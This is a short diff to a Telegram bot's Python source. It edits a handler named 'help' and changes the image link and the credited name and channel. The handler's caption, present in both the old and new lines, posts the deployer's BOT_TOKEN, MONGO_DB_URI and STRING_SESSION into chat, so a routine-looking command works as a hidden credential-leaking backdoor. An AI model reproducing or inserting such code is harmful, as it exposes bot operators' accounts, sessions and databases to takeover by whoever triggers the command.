@@ -123,8 +123,8 @@ async def restartbot(client, message: Message, _):
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f"https://graph.org/file/a4480da6e65dec33fa8ef.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [киιgнт яι∂єя](https://t.me/xo_tera_baap_on_fire)............☆""",
+          photo=f"https://telegra.ph/file/c9bf09ab92ce5432b4cb7.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝗘𝗕𝗗 𝗤𝗡.\n\n☆............𝙱𝚈 » [𝗘𝗕𝗗 𝗤𝗡](https://t.me/MAFIA_RJ)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
